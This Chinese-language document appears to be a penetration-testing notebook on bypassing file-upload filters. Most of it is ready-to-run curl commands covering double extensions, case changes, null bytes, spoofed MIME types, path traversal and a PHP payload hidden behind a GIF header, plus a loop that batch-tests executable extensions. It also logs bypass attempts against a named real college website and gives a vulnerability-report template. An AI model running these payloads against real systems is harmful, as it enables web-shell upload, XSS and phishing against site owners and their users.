# 文件上传绕过技术

## 概述
文件上传绕过是通过修改文件名、扩展名、Content-Type等方式绕过文件类型检查的技术。

## 绕过技术汇总

### 1. 双扩展名绕过
```bash
# 原理: 服务器只检查最后一个扩展名
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.html.jpg"

# 变体
filename=test.html.jpg    # 双扩展名
filename=test.html.png    # 双扩展名+图片
filename=test.html.gif    # 双扩展名+图片
filename=test.html.pdf    # 双扩展名+文档
```

### 2. 大小写绕过
```bash
# 原理: 服务器只检查小写扩展名
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.HTML"

# 变体
filename=test.Html
filename=test.hTml
filename=test.htmL
filename=test.PHP
filename=test.JSP
```

### 3. 空字节绕过
```bash
# 原理: 截断文件名
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.html%00.jpg"

# 注意: 现代服务器可能已修复此漏洞
```

### 4. Content-Type绕过
```bash
# 原理: 修改MIME类型
curl -sk -X POST "https://TARGET/upload" \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  -F "file=@test.html;filename=test.html;type=image/jpeg"

# 变体
type=image/png
type=application/pdf
type=text/plain
```

### 5. 空格/点绕过
```bash
# 原理: 利用文件名解析差异
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.html "  # 空格

curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.html."  # 点

curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.html.."
```

### 6. 特殊字符绕过
```bash
# 原理: 利用特殊字符解析
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.ht%6Dl"  # URL编码

curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.ht\\ml"  # 反斜杠

curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=test.ht ml"  # 空格
```

### 7. 路径遍历绕过
```bash
# 原理: 利用../遍历目录
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@test.html;filename=../../../test.html"

# 变体
filename=....//test.html
filename=..\\..\\test.html
filename=/tmp/test.html  # 绝对路径
```

### 8. 文件头绕过
```bash
# 原理: 添加合法文件头
# GIF89a<?php echo 'test'; ?> > test.php
# PNG文件头 + PHP代码 > test.php

# 创建带GIF头的PHP文件
echo -e "GIF89a<?php echo 'test'; ?>" > /root/test.gif.php
curl -sk -X POST "https://TARGET/upload" \
  -F "file=@/root/test.gif.php;filename=test.gif.php"
```

## 常见可绕过的文件类型

### 高危文件类型
```
.php, .php3, .php4, .php5, .php7, .php8
.phtml, .pht, .phar, .pgif
.php-cgi, .php-s
.jsp, .jspx, .jspa, .jsw, .jsv
.asp, .asa, .cer, .cdx, .htr
.aspx, .ascx, .ashx, .asmx
.shtml, .shtm, .stm
.swf (Flash)
.html, .htm (XSS)
.js (JavaScript)
.xml (XXE)
```

### 测试命令模板
```bash
# 批量测试文件类型
for ext in php php3 php4 php5 php7 php8 phtml pht phar pgif \
           php-cgi php-s jsp jspx jspa jsw jsv asp asa cer cdx htr \
           aspx ascx ashx asmx shtml shtm stm swf html htm js xml; do
  echo "test" > /root/test.${ext}
  resp=$(curl -sk --max-time 5 -X POST "https://TARGET/upload" \
    -F "file=@/root/test.${ext};filename=test.${ext}" 2>/dev/null)
  if echo "$resp" | grep -q "成功\|200"; then
    echo "[!] ${ext} -> 上传成功!"
  fi
done
```

## LyWebServer CMS 文件上传绕过测试结果

**目标:** lycvc.linyi.cn (临沂城市职业学院)

**测试结果:**
```
✅ 上传成功: HTML, JS, CSS, SWF, XML, TXT, JPG, PNG, GIF, PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX, ZIP, RAR
❌ 上传失败: PHP("文件格式不正确"), JSP("文件格式不正确")
```

**绕过尝试:**
```
❌ test.html.jpg -> 上传成功(但扩展名为.jpg，可能不解析)
❌ test.HTML -> 上传成功(但扩展名为.HTML，可能不解析)
❌ test.php5 -> 上传失败
❌ test.phtml -> 上传失败
❌ test.shtml -> 上传失败
```

**结论:** LyWebServer CMS仅允许HTML/JS/CSS/SWF等非可执行文件上传，PHP/JSP变体均被拦截。
但HTML/JS/SWF文件已足够造成XSS、钓鱼等实质危害。

## 报告格式

```
标题: XXX学院官网文件上传绕过致恶意文件上传

漏洞类型: 文件上传绕过
漏洞等级: 高危

复现步骤:

1. 双扩展名绕过
   curl -sk -X POST "https://TARGET/upload" -F "file=@test.html;filename=test.html.jpg"
   响应: {"code":200,"msg":"操作成功",...}

2. 大小写绕过
   curl -sk -X POST "https://TARGET/upload" -F "file=@test.html;filename=test.HTML"
   响应: {"code":200,"msg":"操作成功",...}

3. 验证上传文件可访问
   curl -sk "https://TARGET/pic/.../test.html"
   响应: 返回上传的HTML内容

影响:
1. 可绕过文件类型限制
2. 上传恶意HTML文件
3. 实施XSS攻击
4. 构造钓鱼页面

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N → 8.1
```
